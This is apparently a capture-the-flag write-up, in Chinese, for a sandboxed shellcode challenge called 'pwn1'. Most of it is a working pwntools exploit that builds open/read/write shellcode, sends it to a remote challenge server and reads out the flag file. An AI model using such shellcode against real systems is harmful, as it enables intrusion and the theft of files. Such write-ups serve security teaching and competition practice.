## pwn1
和pre-exam雷同的shellcode challenge，sandbox環境限制`read()`, `write()`, `open()`，將flag開啟後輸出即可。

### exploit
```python
#!/usr/bin/env python3
from pwn import *

context.update(os='linux', arch='amd64')

s = ''
s += shellcraft.pushstr('/home/pwn1/flag')
s += shellcraft.open('rsp', constants.O_RDONLY, 0)
s += shellcraft.mov('r12', 'rax')
s += 'here:'
s += shellcraft.read('r12', 'rsp', 41)
s += shellcraft.write(1, 'rsp', 'rax')
s += 'jmp here'

r = remote('10.13.2.43', 10739)

r.sendline(asm(s))
r.interactive()
```
